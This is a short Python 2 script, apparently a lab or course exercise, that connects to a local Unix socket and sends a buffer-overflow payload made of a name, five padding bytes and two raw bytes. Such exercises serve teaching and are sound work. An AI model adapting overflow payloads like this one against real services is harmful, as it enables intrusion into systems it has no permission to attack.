#! /usr/bin/python
# This should be run with python2. Python3 uses unicode string objects which
# cannot be sent directly to the socket; it's possible to modify this code to
# work but this is the simplest way to make it work.

import socket

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect("socket")

# Put your exploit code here!
exploit = 'dylnuge' + 'A'*5 + '\xfe\xed'
sock.send(exploit)
sock.close()
